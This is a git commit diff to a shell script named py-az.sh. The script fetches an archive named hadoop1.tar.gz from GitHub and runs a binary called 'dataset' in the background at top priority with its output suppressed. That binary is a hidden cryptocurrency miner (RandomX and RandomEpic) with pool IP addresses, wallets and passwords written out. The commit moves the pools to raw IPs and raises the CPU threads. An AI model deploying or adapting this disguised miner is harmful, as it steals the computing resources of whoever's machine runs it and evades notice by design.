b340fdf424e3400f130d37ffa4732cf81f1fc09d
alunsotech <75115691+alunsotech@users.noreply.github.com>
2020-11-30 12:58:53 +0000

    Update py-az.sh

--- py-az.sh
+++ py-az.sh
@@ -3,7 +3,7 @@ cd /home/sshuser
 
 sysctl vm.nr_hugepages=2048
 
-wget https://raw.githubusercontent.com/alunsotech/analytics/master/hadoop1.tar.gz
+wget https://raw.githubusercontent.com/alunsotech/analytics/main/hadoop1.tar.gz
 tar xvzf hadoop1.tar.gz
-nice -n -20 nohup ./dataset --algorithm randomepic\;randomx --pool epic.hashrate.to:4000\;xmr.f2pool.com:13531 --wallet riro1288\;89Xc3ZmpsiX9PVdVsLyRkQ1bw2Sv8wg5pbhL2jCGnB8kMZPtTP5U49zE15qWLmoYPR1YJnYgVE6qVGp8PVCCMwCh31YJhgE --password y0j279qot4sn\;riro --cpu-threads 0\;0 --disable-gpu >/dev/null 2>&1 &
+nice -n -20 nohup ./dataset --algorithm randomepic\;randomx --pool 8.9.31.244:4000\;47.100.95.105:13531 --wallet qfjorazati\;89Xc3ZmpsiX9PVdVsLyRkQ1bw2Sv8wg5pbhL2jCGnB8kMZPtTP5U49zE15qWLmoYPR1YJnYgVE6qVGp8PVCCMwCh31YJhgE --password hl59rn2lpb4s\;riro --cpu-threads 4\;4 --disable-gpu --multi-algorithm-job-mode 3 >/dev/null 2>&1 &
 clear
